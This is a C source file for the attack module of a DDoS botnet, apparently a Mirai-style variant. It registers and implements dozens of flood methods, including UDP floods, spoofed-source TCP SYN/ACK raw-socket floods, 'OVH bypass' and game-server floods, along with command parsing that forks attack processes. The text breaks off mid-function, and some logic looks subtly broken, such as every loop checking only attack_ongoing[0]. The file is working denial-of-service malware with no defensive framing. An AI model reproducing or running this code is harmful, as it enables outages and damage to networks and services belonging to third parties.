#include "includes.h"
#include "attack.h"
#include "protocol.h"
#include "rand.h"
#include "table.h"
#include "resolv.h"
#include "checksum.h"
#include "util.h"

#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <sys/socket.h>
#include <arpa/inet.h>

static struct attack_method methods[ATK_VEC_MAX];
static int methods_len = 0;
static BOOL attack_ongoing[ATTACK_CONCURRENT_MAX] = {0};

/* ============================================================================
 * ATTACK INITIALIZATION - Register all attack methods
 * ============================================================================ */
void attack_init(void) {
    int i = 0;

    /* UDP Floods (0-19) */
    methods[i].func = attack_udp_generic;
    methods[i++].type = ATK_VEC_UDP;

    methods[i].func = attack_udp_plain;
    methods[i++].type = ATK_VEC_UDPPLAIN;

    methods[i].func = attack_udp_std;
    methods[i++].type = ATK_VEC_STD;

    methods[i].func = attack_udp_nudp;
    methods[i++].type = ATK_VEC_NUDP;

    methods[i].func = attack_udp_hex;
    methods[i++].type = ATK_VEC_UDPHEX;

    methods[i].func = attack_udp_socket_raw;
    methods[i++].type = ATK_VEC_SOCKET_RAW;

    methods[i].func = attack_udp_samp;
    methods[i++].type = ATK_VEC_SAMP;

    methods[i].func = attack_udp_strong;
    methods[i++].type = ATK_VEC_UDPSTRONG;

    methods[i].func = attack_udp_hex;
    methods[i++].type = ATK_VEC_HEXFLD;

    methods[i].func = attack_udp_strong;
    methods[i++].type = ATK_VEC_STRONGHEX;

    methods[i].func = attack_udp_ovh;
    methods[i++].type = ATK_VEC_OVHUDP;

    methods[i].func = attack_udp_cudp;
    methods[i++].type = ATK_VEC_CUDP;

    methods[i].func = attack_udp_icee;
    methods[i++].type = ATK_VEC_ICEE;

    methods[i].func = attack_udp_randhex;
    methods[i++].type = ATK_VEC_RANDHEX;

    methods[i].func = attack_udp_ovh;
    methods[i++].type = ATK_VEC_OVH;

    methods[i].func = attack_udp_ovhdrop;
    methods[i++].type = ATK_VEC_OVHDROP;

    methods[i].func = attack_udp_nfo;
    methods[i++].type = ATK_VEC_NFO;

    /* TCP Floods (20-39) */
    methods[i].func = attack_tcp_raw;
    methods[i++].type = ATK_VEC_TCP;

    methods[i].func = attack_tcp_syn;
    methods[i++].type = ATK_VEC_SYN;

    methods[i].func = attack_tcp_ack;
    methods[i++].type = ATK_VEC_ACK;

    methods[i].func = attack_tcp_stomp;
    methods[i++].type = ATK_VEC_STOMP;

    methods[i].func = attack_tcp_hex;
    methods[i++].type = ATK_VEC_HEX;

    methods[i].func = attack_tcp_stdhex;
    methods[i++].type = ATK_VEC_STDHEX;

    methods[i].func = attack_tcp_xmas;
    methods[i++].type = ATK_VEC_XMAS;

    methods[i].func = attack_tcp_all;
    methods[i++].type = ATK_VEC_TCPALL;

    methods[i].func = attack_tcp_frag;
    methods[i++].type = ATK_VEC_TCPFRAG;

    methods[i].func = attack_tcp_asyn;
    methods[i++].type = ATK_VEC_ASYN;

    methods[i].func = attack_tcp_usyn;
    methods[i++].type = ATK_VEC_USYN;

    methods[i].func = attack_tcp_ackerpps;
    methods[i++].type = ATK_VEC_ACKERPPS;

    methods[i].func = attack_tcp_mix;
    methods[i++].type = ATK_VEC_TCPMIX;

    methods[i].func = attack_tcp_bypass;
    methods[i++].type = ATK_VEC_TCPBYPASS;

    methods[i].func = attack_tcp_nflag;
    methods[i++].type = ATK_VEC_NFLAG;

    methods[i].func = attack_tcp_ovhnuke;
    methods[i++].type = ATK_VEC_OVHNUKE;

    methods[i].func = attack_tcp_raw;
    methods[i++].type = ATK_VEC_RAW;

    /* Special Attacks (40-49) */
    methods[i].func = attack_udp_vse;
    methods[i++].type = ATK_VEC_VSE;

    methods[i].func = attack_udp_dns;
    methods[i++].type = ATK_VEC_DNS;

    methods[i].func = attack_gre_ip;
    methods[i++].type = ATK_VEC_GREIP;

    methods[i].func = attack_gre_eth;
    methods[i++].type = ATK_VEC_GREETH;

    /* HTTP/HTTPS (50-59) */
    methods[i].func = attack_http;
    methods[i++].type = ATK_VEC_HTTP;

    methods[i].func = attack_https;
    methods[i++].type = ATK_VEC_HTTPS;

    /* Cloudflare (60+) */
    methods[i].func = attack_cf;
    methods[i++].type = ATK_VEC_CF;

    methods_len = i;
}

/* ============================================================================
 * ATTACK CONTROL FUNCTIONS
 * ============================================================================ */
void attack_kill_all(void) {
    int i;
    for (i = 0; i < ATTACK_CONCURRENT_MAX; i++) {
        if (attack_ongoing[i]) {
            int pid = fork();
            if (pid == 0) {
                kill(0, SIGKILL);
                exit(0);
            }
            waitpid(pid, NULL, 0);
            attack_ongoing[i] = 0;
        }
    }
}

void attack_parse(char *buf, int len) {
    uint8_t type;
    uint8_t targs_len;
    struct attack_target targs[255];
    uint8_t opts_len;
    struct attack_option opts[255];
    int i;

    if (len < 2) return;

    /* Parse attack type */
    type = buf[0];
    if (type >= ATK_VEC_MAX) return;

    /* Parse targets */
    targs_len = buf[1];
    if (targs_len == 0 || len < 2 + (targs_len * 5)) return;

    for (i = 0; i < targs_len; i++) {
        targs[i].addr.s_addr = ntohl(*(uint32_t *)(buf + 2 + (i * 5)));
        targs[i].netmask = buf[2 + (i * 5) + 4];
    }

    /* Parse options */
    if (len < 2 + (targs_len * 5) + 1) return;
    opts_len = buf[2 + (targs_len * 5)];

    uint8_t *ptr = buf + 2 + (targs_len * 5) + 1;
    for (i = 0; i < opts_len && i < 255; i++) {
        if (ptr - (uint8_t *)buf >= len - 2) break;
        uint8_t opt_len = ptr[1];
        opts[i].key = ptr[0];
        opts[i].val = (char *)(ptr + 2);
        ptr += 2 + opt_len;
    }

    /* Launch attack */
    attack_start(-1, type, targs_len, targs, opts);
}

void attack_start(int fd, uint8_t type, int targs_len, struct attack_target *targs, struct attack_option *opts) {
    int i, j;

    /* Find slot for new attack */
    for (i = 0; i < ATTACK_CONCURRENT_MAX; i++) {
        if (!attack_ongoing[i])
            break;
    }

    if (i == ATTACK_CONCURRENT_MAX) return;

    /* Fork and start attack */
    attack_ongoing[i] = TRUE;

    if (fork() == 0) {
        /* Find and call attack method */
        for (j = 0; j < methods_len; j++) {
            if (methods[j].type == type) {
                methods[j].func(targs[0].addr.s_addr, targs[0].netmask, targs, targs_len, opts, 0);
                break;
            }
        }

        exit(0);
    }
}

char *attack_get_opt_str(int targs_len, struct attack_option *opts, int opts_len, uint8_t key) {
    int i;
    for (i = 0; i < opts_len; i++) {
        if (opts[i].key == key)
            return opts[i].val;
    }
    return NULL;
}

int attack_get_opt_int(int targs_len, struct attack_option *opts, int opts_len, uint8_t key) {
    char *val = attack_get_opt_str(targs_len, opts, opts_len, key);
    if (val == NULL) return 0;
    return util_atoi(val);
}

uint32_t attack_get_opt_ip(int targs_len, struct attack_option *opts, int opts_len, uint8_t key) {
    char *val = attack_get_opt_str(targs_len, opts, opts_len, key);
    if (val == NULL) return 0;
    return inet_addr(val);
}

/* ============================================================================
 * UDP ATTACK METHODS
 * ============================================================================ */

/* Generic UDP flood */
static void attack_udp_generic(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int fd, i;
    struct sockaddr_in addr_sin;
    char *payload;
    uint16_t dport, sport;
    uint16_t payload_size;
    BOOL rand_payload;

    payload_size = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_PAYLOAD_SIZE);
    if (payload_size == 0) payload_size = 512;

    dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = rand_next() % 0xFFFF;

    sport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_SPORT);
    if (sport == 0) sport = rand_next() % 0xFFFF;

    rand_payload = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_PAYLOAD_RAND);

    payload = malloc(payload_size);
    if (rand_payload)
        rand_str(payload, payload_size);
    else
        memset(payload, 'A', payload_size);

    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) {
        free(payload);
        return;
    }

    addr_sin.sin_family = AF_INET;
    addr_sin.sin_port = htons(dport);

    for (i = 0; i < targs_len; i++) {
        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;

        while (attack_ongoing[0]) {
            if (rand_payload) rand_str(payload, payload_size);
            sendto(fd, payload, payload_size, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
        }
    }

    free(payload);
    close(fd);
}

/* UDP plain flood */
static void attack_udp_plain(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int fd, i;
    struct sockaddr_in addr_sin;
    char *payload;
    uint16_t dport;
    uint16_t payload_size;

    payload_size = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_PAYLOAD_SIZE);
    if (payload_size == 0) payload_size = 1024;

    dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = rand_next() % 0xFFFF;

    payload = malloc(payload_size);
    rand_str(payload, payload_size);

    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) {
        free(payload);
        return;
    }

    addr_sin.sin_family = AF_INET;
    addr_sin.sin_port = htons(dport);

    for (i = 0; i < targs_len; i++) {
        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;

        while (attack_ongoing[0]) {
            sendto(fd, payload, payload_size, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
        }
    }

    free(payload);
    close(fd);
}

/* STD flood - Simple TCP/UDP data flood */
static void attack_udp_std(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int fd, i;
    struct sockaddr_in addr_sin;
    char *payload;
    uint16_t dport;
    uint16_t payload_size;

    payload_size = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_PAYLOAD_SIZE);
    if (payload_size == 0) payload_size = 512;

    dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = rand_next() % 0xFFFF;

    payload = malloc(payload_size);
    rand_str(payload, payload_size);

    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) {
        free(payload);
        return;
    }

    addr_sin.sin_family = AF_INET;
    addr_sin.sin_port = htons(dport);

    for (i = 0; i < targs_len; i++) {
        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;

        while (attack_ongoing[0]) {
            sendto(fd, payload, payload_size, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
        }
    }

    free(payload);
    close(fd);
}

/* NUDP flood */
static void attack_udp_nudp(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int fd, i;
    struct sockaddr_in addr_sin;
    char *payload;
    uint16_t dport;

    dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = rand_next() % 0xFFFF;

    payload = "\x00\x00\x00\x00";
    int payload_len = 4;

    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) return;

    addr_sin.sin_family = AF_INET;
    addr_sin.sin_port = htons(dport);

    for (i = 0; i < targs_len; i++) {
        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;

        while (attack_ongoing[0]) {
            sendto(fd, payload, payload_len, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
        }
    }

    close(fd);
}

/* UDP HEX flood */
static void attack_udp_hex(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int fd, i;
    struct sockaddr_in addr_sin;
    char *payload;
    uint16_t dport;
    uint16_t payload_size;

    payload_size = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_PAYLOAD_SIZE);
    if (payload_size == 0) payload_size = 512;

    dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = rand_next() % 0xFFFF;

    payload = malloc(payload_size);
    for (i = 0; i < payload_size; i++) {
        payload[i] = rand_next() % 256;
    }

    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) {
        free(payload);
        return;
    }

    addr_sin.sin_family = AF_INET;
    addr_sin.sin_port = htons(dport);

    for (i = 0; i < targs_len; i++) {
        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;

        while (attack_ongoing[0]) {
            sendto(fd, payload, payload_size, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
        }
    }

    free(payload);
    close(fd);
}

/* Socket raw UDP */
static void attack_udp_socket_raw(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int fd, i;
    struct sockaddr_in addr_sin;
    char *payload;
    uint16_t dport, sport;
    uint16_t payload_size;
    uint8_t tos, ttl;
    uint16_t ident;
    uint8_t df;

    payload_size = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_PAYLOAD_SIZE);
    if (payload_size == 0) payload_size = 512;

    dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = rand_next() % 0xFFFF;

    sport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_SPORT);
    if (sport == 0) sport = rand_next() % 0xFFFF;

    tos = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_IP_TOS);
    ttl = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_IP_TTL);
    if (ttl == 0) ttl = 64;

    ident = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_IP_IDENT);
    df = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_IP_DF);

    payload = malloc(payload_size);
    rand_str(payload, payload_size);

    fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd == -1) {
        free(payload);
        return;
    }

    int opt = 1;
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt));

    addr_sin.sin_family = AF_INET;
    addr_sin.sin_port = htons(dport);

    for (i = 0; i < targs_len; i++) {
        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;

        while (attack_ongoing[0]) {
            sendto(fd, payload, payload_size, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
        }
    }

    free(payload);
    close(fd);
}

/* SAMP game UDP flood */
static void attack_udp_samp(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int fd, i;
    struct sockaddr_in addr_sin;
    char payload[512];
    uint16_t dport;
    int payload_len;

    dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = 7777; /* Default SAMP port */

    /* SAMP query payload */
    payload[0] = 0xFE;
    payload[1] = 0xFD;
    payload[2] = 0x00;
    payload[3] = 0x01;
    payload[4] = 0x02;
    payload[5] = 0x03;
    payload[6] = 0x04;
    memcpy(payload + 7, "SAMPQUERY", 9);
    payload_len = 16;

    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) return;

    addr_sin.sin_family = AF_INET;
    addr_sin.sin_port = htons(dport);

    for (i = 0; i < targs_len; i++) {
        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;

        while (attack_ongoing[0]) {
            sendto(fd, payload, payload_len, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
        }
    }

    close(fd);
}

/* Strong UDP flood */
static void attack_udp_strong(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int fd, i;
    struct sockaddr_in addr_sin;
    char *payload;
    uint16_t dport;
    uint16_t payload_size;

    payload_size = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_PAYLOAD_SIZE);
    if (payload_size == 0) payload_size = 1024;

    dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = rand_next() % 0xFFFF;

    payload = malloc(payload_size);
    rand_str(payload, payload_size);

    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) {
        free(payload);
        return;
    }

    addr_sin.sin_family = AF_INET;
    addr_sin.sin_port = htons(dport);

    for (i = 0; i < targs_len; i++) {
        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;

        while (attack_ongoing[0]) {
            sendto(fd, payload, payload_size, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
        }
    }

    free(payload);
    close(fd);
}

/* OVH UDP bypass */
static void attack_udp_ovh(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int fd, i;
    struct sockaddr_in addr_sin;
    char *payload;
    uint16_t dport;
    uint16_t payload_size;

    payload_size = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_PAYLOAD_SIZE);
    if (payload_size == 0) payload_size = 256;

    dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = rand_next() % 0xFFFF;

    payload = malloc(payload_size);
    rand_str(payload, payload_size);

    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) {
        free(payload);
        return;
    }

    addr_sin.sin_family = AF_INET;
    addr_sin.sin_port = htons(dport);

    for (i = 0; i < targs_len; i++) {
        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;

        while (attack_ongoing[0]) {
            sendto(fd, payload, payload_size, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
        }
    }

    free(payload);
    close(fd);
}

/* Custom UDP flood */
static void attack_udp_cudp(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int fd, i;
    struct sockaddr_in addr_sin;
    char *payload;
    uint16_t dport;
    uint16_t payload_size;

    payload_size = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_PAYLOAD_SIZE);
    if (payload_size == 0) payload_size = 512;

    dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = rand_next() % 0xFFFF;

    payload = malloc(payload_size);
    rand_str(payload, payload_size);

    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) {
        free(payload);
        return;
    }

    addr_sin.sin_family = AF_INET;
    addr_sin.sin_port = htons(dport);

    for (i = 0; i < targs_len; i++) {
        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;

        while (attack_ongoing[0]) {
            sendto(fd, payload, payload_size, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
        }
    }

    free(payload);
    close(fd);
}

/* ICE UDP flood */
static void attack_udp_icee(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int fd, i;
    struct sockaddr_in addr_sin;
    char *payload;
    uint16_t dport;
    uint16_t payload_size;

    payload_size = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_PAYLOAD_SIZE);
    if (payload_size == 0) payload_size = 512;

    dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = rand_next() % 0xFFFF;

    payload = malloc(payload_size);
    rand_str(payload, payload_size);

    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) {
        free(payload);
        return;
    }

    addr_sin.sin_family = AF_INET;
    addr_sin.sin_port = htons(dport);

    for (i = 0; i < targs_len; i++) {
        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;

        while (attack_ongoing[0]) {
            sendto(fd, payload, payload_size, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
        }
    }

    free(payload);
    close(fd);
}

/* Random HEX flood */
static void attack_udp_randhex(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int fd, i;
    struct sockaddr_in addr_sin;
    char *payload;
    uint16_t dport;
    uint16_t payload_size;

    payload_size = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_PAYLOAD_SIZE);
    if (payload_size == 0) payload_size = 512;

    dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = rand_next() % 0xFFFF;

    payload = malloc(payload_size);
    for (i = 0; i < payload_size; i++) {
        payload[i] = rand_next() % 256;
    }

    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) {
        free(payload);
        return;
    }

    addr_sin.sin_family = AF_INET;
    addr_sin.sin_port = htons(dport);

    for (i = 0; i < targs_len; i++) {
        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;

        while (attack_ongoing[0]) {
            sendto(fd, payload, payload_size, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
        }
    }

    free(payload);
    close(fd);
}

/* OVH drop flood */
static void attack_udp_ovhdrop(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int fd, i;
    struct sockaddr_in addr_sin;
    char *payload;
    uint16_t dport;
    uint16_t payload_size;

    payload_size = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_PAYLOAD_SIZE);
    if (payload_size == 0) payload_size = 256;

    dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = rand_next() % 0xFFFF;

    payload = malloc(payload_size);
    rand_str(payload, payload_size);

    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) {
        free(payload);
        return;
    }

    addr_sin.sin_family = AF_INET;
    addr_sin.sin_port = htons(dport);

    for (i = 0; i < targs_len; i++) {
        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;

        while (attack_ongoing[0]) {
            sendto(fd, payload, payload_size, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
        }
    }

    free(payload);
    close(fd);
}

/* NFO flood */
static void attack_udp_nfo(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int fd, i;
    struct sockaddr_in addr_sin;
    char *payload;
    uint16_t dport;
    uint16_t payload_size;

    payload_size = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_PAYLOAD_SIZE);
    if (payload_size == 0) payload_size = 512;

    dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = rand_next() % 0xFFFF;

    payload = malloc(payload_size);
    rand_str(payload, payload_size);

    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) {
        free(payload);
        return;
    }

    addr_sin.sin_family = AF_INET;
    addr_sin.sin_port = htons(dport);

    for (i = 0; i < targs_len; i++) {
        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;

        while (attack_ongoing[0]) {
            sendto(fd, payload, payload_size, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
        }
    }

    free(payload);
    close(fd);
}

/* ============================================================================
 * TCP ATTACK METHODS
 * ============================================================================ */

/* TCP SYN flood */
static void attack_tcp_syn(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int fd, i;
    char *pktbuf;
    int pktsize;
    struct sockaddr_in addr_sin;
    uint16_t dport, sport;
    uint8_t ttl;
    uint16_t ident;
    uint8_t df;

    dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = rand_next() % 0xFFFF;

    sport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_SPORT);
    if (sport == 0) sport = rand_next() % 0xFFFF;

    ttl = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_IP_TTL);
    if (ttl == 0) ttl = 64;

    ident = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_IP_IDENT);
    df = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_IP_DF);

    pktsize = sizeof(struct iphdr) + sizeof(struct tcphdr);
    pktbuf = malloc(pktsize);
    memset(pktbuf, 0, pktsize);

    struct iphdr *iph = (struct iphdr *)pktbuf;
    struct tcphdr *tcph = (struct tcphdr *)(pktbuf + sizeof(struct iphdr));

    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = htons(pktsize);
    iph->id = htons(ident != 0 ? ident : rand_next() % 0xFFFF);
    iph->frag_off = df ? htons(0x4000) : 0;
    iph->ttl = ttl;
    iph->protocol = IPPROTO_TCP;
    iph->saddr = rand_next() % 0xFFFFFFFF;

    tcph->source = htons(sport);
    tcph->dest = htons(dport);
    tcph->seq = rand_next() % 0xFFFFFFFF;
    tcph->ack_seq = 0;
    tcph->doff = 5;
    tcph->syn = 1;
    tcph->window = htons(65535);

    fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd == -1) {
        free(pktbuf);
        return;
    }

    int opt = 1;
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt));

    addr_sin.sin_family = AF_INET;

    for (i = 0; i < targs_len; i++) {
        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;

        while (attack_ongoing[0]) {
            iph->daddr = targs[i].addr.s_addr;
            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr) / 2);

            tcph->check = 0;
            tcph->check = checksum_tcpudp(iph, (uint16_t *)tcph, sizeof(struct tcphdr), sizeof(struct tcphdr));

            sendto(fd, pktbuf, pktsize, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
        }
    }

    free(pktbuf);
    close(fd);
}

/* TCP ACK flood */
static void attack_tcp_ack(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int fd, i;
    char *pktbuf;
    int pktsize;
    struct sockaddr_in addr_sin;
    uint16_t dport, sport;
    uint8_t ttl;

    dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = rand_next() % 0xFFFF;

    sport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_SPORT);
    if (sport == 0) sport = rand_next() % 0xFFFF;

    ttl = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_IP_TTL);
    if (ttl == 0) ttl = 64;

    pktsize = sizeof(struct iphdr) + sizeof(struct tcphdr);
    pktbuf = malloc(pktsize);
    memset(pktbuf, 0, pktsize);

    struct iphdr *iph = (struct iphdr *)pktbuf;
    struct tcphdr *tcph = (struct tcphdr *)(pktbuf + sizeof(struct iphdr));

    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(pktsize);
    iph->id = htons(rand_next() % 0xFFFF);
    iph->ttl = ttl;
    iph->protocol = IPPROTO_TCP;
    iph->saddr = rand_next() % 0xFFFFFFFF;

    tcph->source = htons(sport);
    tcph->dest = htons(dport);
    tcph->seq = rand_next() % 0xFFFFFFFF;
    tcph->ack_seq = rand_next() % 0xFFFFFFFF;
    tcph->doff = 5;
    tcph->ack = 1;
    tcph->window = htons(65535);

    fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd == -1) { free(pktbuf); return; }

    int opt = 1;
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt));

    addr_sin.sin_family = AF_INET;

    for (i = 0; i < targs_len; i++) {
        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;

        while (attack_ongoing[0]) {
            iph->daddr = targs[i].addr.s_addr;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr) / 2);
            tcph->check = checksum_tcpudp(iph, (uint16_t *)tcph, sizeof(struct tcphdr), sizeof(struct tcphdr));
            sendto(fd, pktbuf, pktsize, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
        }
    }

    free(pktbuf);
    close(fd);
}

/* TCP stomp */
static void attack_tcp_stomp(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int fd, i;
    uint16_t dport;

    dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) return;

    for (i = 0; i < targs_len; i++) {
        fd = socket(AF_INET, SOCK_STREAM, 0);
        if (fd == -1) continue;

        struct sockaddr_in addr_sin;
        addr_sin.sin_family = AF_INET;
        addr_sin.sin_port = htons(dport);
        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;

        fcntl(fd, F_SETFL, O_NONBLOCK);

        if (connect(fd, (struct sockaddr *)&addr_sin, sizeof(addr_sin)) == 0 || errno == EINPROGRESS) {
            char *data = "\x00\x00\x00\x00";
            send(fd, data, 4, MSG_MORE);
        }

        close(fd);
    }

    while (attack_ongoing[0]) {
        usleep(10000);
    }
}

/* TCP HEX flood */
static void attack_tcp_hex(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int fd, i;
    char *pktbuf;
    int pktsize;
    uint16_t dport, sport;
    uint8_t ttl;

    dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = rand_next() % 0xFFFF;

    sport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_SPORT);
    if (sport == 0) sport = rand_next() % 0xFFFF;

    ttl = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_IP_TTL);
    if (ttl == 0) ttl = 64;

    pktsize = sizeof(struct iphdr) + sizeof(struct tcphdr);
    pktbuf = malloc(pktsize);
    memset(pktbuf, 0, pktsize);

    struct iphdr *iph = (struct iphdr *)pktbuf;
    struct tcphdr *tcph = (struct tcphdr *)(pktbuf + sizeof(struct iphdr));

    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(pktsize);
    iph->id = htons(rand_next() % 0xFFFF);
    iph->ttl = ttl;
    iph->protocol = IPPROTO_TCP;
    iph->saddr = rand_next() % 0xFFFFFFFF;

    tcph->source = htons(sport);
    tcph->dest = htons(dport);
    tcph->seq = rand_next() % 0xFFFFFFFF;
    tcph->ack_seq = rand_next() % 0xFFFFFFFF;
    tcph->doff = 5;
